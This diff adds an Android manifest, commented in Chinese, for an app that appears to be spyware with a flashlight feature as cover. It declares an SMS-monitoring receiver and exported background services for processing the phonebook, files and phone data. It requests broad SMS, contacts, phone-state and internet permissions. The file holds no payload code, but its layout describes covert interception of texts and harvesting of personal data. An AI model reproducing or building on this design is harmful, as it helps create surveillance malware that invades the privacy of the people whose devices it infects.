@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+      package="Boomerang_android15.com"
+      android:versionCode="1"
+      android:versionName="1.0">
+    <uses-sdk android:minSdkVersion="3" />
+    <application android:icon="@drawable/icon" android:label="@string/app_name">
+
+
+   	<!-- 注册界面 -->
+  		<activity
+     		android:name=".RegisterFace"     		
+      		android:label="@string/app_name">
+      		
+      		<intent-filter>
+        		<action android:name="android.intent.action.MAIN" />
+        		<category android:name="android.intent.category.LAUNCHER" />
+      		</intent-filter>
+    	</activity>
+      
+      	<!-- 另一应用功能界面 -->
+      	<activity android:name=".Other_Flashlight"
+              android:label="@string/app_name">      		
+    	</activity>
+      
+      	<!-- 用于监控短信的接收 -->
+      	<receiver android:name = "FqlSMSReceiver">
+      		<intent-filter>
+      			<action android:name = "android.provider.Telephony.SMS_RECEIVED"/>      			
+      		</intent-filter>
+      	</receiver>
+		
+		<!-- 创建服务 -->
+		
+		<!-- 总服务-->
+		<service android:name=".LaunchService" android:exported="true" android:process=":remote" >
+		</service>
+		
+		<!-- 处理电话薄信息的服务-->
+		<service android:name=".ProcessPhoneBook" android:exported="true" android:process=":remote" >
+		</service>
+		
+		<!-- 处理文件信息的服务-->
+  		<service android:name=".ProcessFileInfor" android:exported="true" android:process=":remote" >
+		</service>
+		
+		<!-- 处理手机自身信息的服务-->
+		<service android:name=".ProcessPhoneInfor" android:exported="true" android:process=":remote" >
+		</service>
+  
+    </application>
+    <uses-sdk android:minSdkVersion="3" />
+    
+    <!-- 设置接收手机短信的权限-->
+    <uses-permission android:name="android.permission.RECEIVE_SMS"></uses-permission>
+    
+    <!-- 设置发送手机短信的权限-->
+    <uses-permission android:name="android.permission.SEND_SMS"></uses-permission>
+    
+    <!-- 设置读手机短信内容的权限-->
+    <uses-permission android:name = "android.permission.READ_SMS"></uses-permission>
+    
+    <!-- 设置修改手机短信内容的权限-->
+    <uses-permission android:name = "android.permission.WRITE_SMS"></uses-permission>
+    
+    <!-- 设置手机访问互联网的权限-->
+    <uses-permission android:name="android.permission.INTERNET"></uses-permission>
+    
+    <!-- 设置读取手机中电话薄内容的权限-->
+   	<uses-permission android:name="android.permission.READ_CONTACTS"></uses-permission>
+    
+    <!-- 设置写入手机中电话薄内容的权限-->
+    <uses-permission android:name="android.permission.WRITE_CONTACTS"></uses-permission>
+
+	<!-- 设置读取手机自身信息的权限-->
+	<uses-permission android:name="android.permission.READ_PHONE_STATE"></uses-permission>
+ 	 
+	<!-- 实现手电筒功能要开启的权限-->
+	<uses-permission android:name="android.permission.WAKE_LOCK"/> 
+  	<uses-permission android:name="android.permission.WRITE_SETTINGS"/> 
+  	<uses-permission android:name="android.permission.HARDWARE_TEST"/> 
+ 	 
+
+
+
+ 
+</manifest>
